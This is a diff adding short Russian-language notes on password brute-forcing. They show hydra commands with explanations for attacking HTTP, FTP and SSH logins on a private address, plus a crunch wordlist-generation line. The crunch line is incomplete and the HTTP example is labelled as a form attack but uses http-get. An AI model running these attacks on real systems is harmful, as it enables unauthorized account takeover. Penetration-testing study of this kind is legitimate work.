@@ -1,0 +1,22 @@
+Словари для перебора паролей хранятся в
+/usr/share/wordlists
+
+Атака на HTTP (форма авторизации)
+hydra -l admin -P /path/to/wordlist.txt http-get://192.168.1.100/login
+Логин: admin
+Пароли берутся из словаря /path/to/wordlist.txt
+Протокол — http-get
+Цель — страница с URL /login на 192.168.1.100
+
+Атака на FTP
+hydra -l admin -P /path/to/wordlist.txt ftp://192.168.1.100
+Логин: admin
+Пароли берутся из словаря /path/to/wordlist.txt
+Протокол — ftp
+Цель — 192.168.1.100
+
+Атака с многими логинами
+hydra -L /path/to/userlist.txt -P /path/to/wordlist.txt ssh://192.168.1.100
+
+
+crunch 6 8 -o dictionary.txt -t @@@@@@ -c
